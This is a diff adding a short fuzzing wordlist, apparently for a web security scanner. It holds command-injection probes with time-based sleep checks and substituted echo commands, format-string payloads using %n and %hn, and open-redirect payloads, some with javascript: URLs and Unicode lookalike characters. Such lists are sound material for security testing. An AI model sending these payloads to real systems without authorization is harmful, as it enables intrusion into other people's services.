@@ -1,0 +1,25 @@
+cmd	& sleep 0 && str=$(echo FRMTBN) && str1=${#str} && [ 9 -eq ${str1} ]
+cmd	; str=$(echo RPPEVG); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 5; fi
+cmd	" | str=$(echo ABC) | str1=${#str}
+cmd	\n str=$(echo JLLXMB)\n str1=${#str}\n if [ 6 -ne ${str1} ]\n then sleep 0\n fi
+cmd	`echo QWERTY`
+cmd	$(echo QWERTY)
+cmd	a;echo PWNED
+cmd	x|printf hello
+cmd	if [ 3 -ne ${#str} ]; then sleep 5; fi
+format	AAAAA%x
+format	ppppp%n
+format	XXXXX.%p
+format	%p * 55
+format	%d * 55
+format	f(x)=%s x 123
+format	%.16705u%2\$hn
+format	%.2049d
+format	%99999999999s
+redirect	//google.com//
+redirect	<>javascript:alert(1);
+redirect	/	/javascript:alert(1)
+redirect	//google。com
+redirect	/ーgoogle.com
+redirect	ｰgoogle.com
+redirect	/〱google.com
